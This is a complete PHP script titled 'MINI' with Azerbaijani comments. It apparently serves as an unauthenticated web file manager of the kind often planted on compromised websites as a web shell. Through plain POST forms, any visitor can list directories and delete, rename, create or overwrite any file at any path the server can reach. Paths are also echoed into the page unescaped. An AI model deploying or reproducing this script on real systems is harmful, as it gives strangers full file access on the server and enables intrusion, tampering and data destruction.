<?php
// Verilmiş yol üzrə fayl və qovluqların siyahısını almaq üçün funksiya
function getFiles($path)
{
    $files = scandir($path);
    $fileList = [];

    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'qovluq' : 'fayl',
            ];
            array_push($fileList, $fileInfo);
        }
    }

    return $fileList;
}

// Fayl və ya qovluğu silmək üçün funksiya
function deleteFile($path)
{
    if (is_file($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file) {
            deleteFile($path . '/' . $file);
        }

        return rmdir($path);
    }

    return false;
}

// Fayl və ya qovluğun adını dəyişdirmək üçün funksiya
function renameFile($oldPath, $newPath)
{
    return rename($oldPath, $newPath);
}

// Yeni fayl yaratmaq üçün funksiya
function createFile($path, $filename)
{
    $filePath = $path . '/' . $filename;
    return touch($filePath);
}

// Yeni qovluq yaratmaq üçün funksiya
function createDirectory($path, $dirname)
{
    $dirPath = $path . '/' . $dirname;
    return mkdir($dirPath);
}

// Fayl düzəltmək üçün funksiya
function editFile($filePath, $content)
{
    return file_put_contents($filePath, $content);
}

// Fayl idarəetmə əməliyyatlarını icra etmək üçün
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';

    if ($action === 'getFiles') {
        // Verilmiş yoldakı fayl və qovluqları alın
        $fileList = getFiles($path);
        echo json_encode($fileList);
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'delete' && isset($_POST['deletePath'])) {
        // Fayl və ya qovluğu silmək
        $deletePath = $_POST['deletePath'];
        $success = deleteFile($deletePath);

        if ($success) {
            echo 'Fayl və ya qovluq uğurla silindi.';
        } else {
            echo 'Fayl və ya qovluq silmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'rename' && isset($_POST['oldPath']) && isset($_POST['newPath'])) {
        // Fayl və ya qovluğun adını dəyişdirmək
        $oldPath = $_POST['oldPath'];
        $newPath = $_POST['newPath'];
        $success = renameFile($oldPath, $newPath);

        if ($success) {
            echo 'Fayl və ya qovluq uğurla adlandırıldı.';
        } else {
            echo 'Fayl və ya qovluq adını dəyişdirmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'createFile' && isset($_POST['filename'])) {
        // Yeni fayl yaratmaq
        $filename = $_POST['filename'];
        $success = createFile($path, $filename);

        if ($success) {
            echo 'Fayl uğurla yaradıldı.';
        } else {
            echo 'Fayl yaratmaq mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'createDirectory' && isset($_POST['dirname'])) {
        // Yeni qovluq yaratmaq
        $dirname = $_POST['dirname'];
        $success = createDirectory($path, $dirname);

        if ($success) {
            echo 'Qovluq uğurla yaradıldı.';
        } else {
            echo 'Qovluq yaratmaq mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    } elseif ($action === 'editFile' && isset($_POST['filePath']) && isset($_POST['content'])) {
        // Faylı düzəltmək
        $filePath = $_POST['filePath'];
        $content = $_POST['content'];
        $success = editFile($filePath, $content);

        if ($success) {
            echo 'Fayl uğurla düzəldildi.';
        } else {
            echo 'Faylı düzəltmək mümkün olmadı.';
        }
        exit; // Skriptin daha əlavə icrasını qarışdırmaq üçün əlavə edildi
    }
}

// Dizinleri gəzmə
function listDirectories($path)
{
    $directories = glob($path . '/*', GLOB_ONLYDIR);
    foreach ($directories as $directory) {
        $directoryName = basename($directory);
        echo '<li>';
        echo '<span class="file-icon">';
        echo '<img src="https://img.icons8.com/color/48/000000/folder-invoices.png" alt="Qovluq İkonu">';
        echo '</span>';
        echo '<span class="file-name">' . $directoryName . '</span>';
        echo '<a href="?path=' . $directory . '">Görüntülə</a>';
        echo '</li>';
    }
}

// Faylları listələmə
function listFiles($path)
{
    $files = glob($path . '/*');
    foreach ($files as $file) {
        if (!is_dir($file)) {
            $fileName = basename($file);
            echo '<li>';
            echo '<span class="file-icon">';
            echo '<img src="https://img.icons8.com/color/48/000000/file.png" alt="Fayl İkonu">';
            echo '</span>';
            echo '<span class="file-name">' . $fileName . '</span>';
            echo '<a href="' . $file . '" download>Yüklə</a>';
            echo '</li>';
        }
    }
}

// Başlanğıc yolu
$initialPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$fileList = getFiles($initialPath);
?>

<!DOCTYPE html>
<html>
<head>
    <title>MINI</title>
<link rel="shortcut icon" type="image/png" href=""/>
    <style>
        body {
            background-color: #000000;
			color: white;
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        h1 {
            margin-bottom: 20px;
        }

        .file-list {
            list-style-type: none;
            padding: 0;
        }

        .file-list li {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }

        .file-list li .file-icon {
            margin-right: 10px;
        }

        .file-list li .file-name {
            flex-grow: 1;
        }

        .actions {
            margin-top: 10px;
        }

        .actions input[type="text"] {
            margin-right: 10px;
        }

        .actions input[type="submit"] {
            cursor: pointer;
        }
    </style>
</head>
<body>
<h1>Fayl Menecer</h1>

<div class="current-directory">
        Kataloq (dizin): <?php echo realpath($initialPath); ?>
</div>

<ul class="file-list">
    <?php listDirectories($initialPath); ?>
    <?php listFiles($initialPath); ?>
</ul>

<div class="actions">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="deletePath" placeholder="Silmək üçün fayl və ya qovluq" required>
        <input type="submit" value="Sil">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="oldPath" placeholder="Hazırkı fayl və ya qovluq yolu" required>
        <input type="text" name="newPath" placeholder="Yeni fayl və ya qovluq yolu" required>
        <input type="submit" value="Adını Dəyiş">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filename" placeholder="Yeni fayl adı" required>
        <input type="submit" value="Fayl Yarat">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createDirectory">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="dirname" placeholder="Yeni qovluq adı" required>
        <input type="submit" value="Qovluq Yarat">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="editFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filePath" placeholder="Düzəltmək üçün fayl yolu" required>
        <textarea name="content" rows="5" cols="40" placeholder="Düzəltmək üçün mətn" required></textarea>
        <input type="submit" value="Faylı Düzəlt">
    </form>
</div>

</body>
</html>
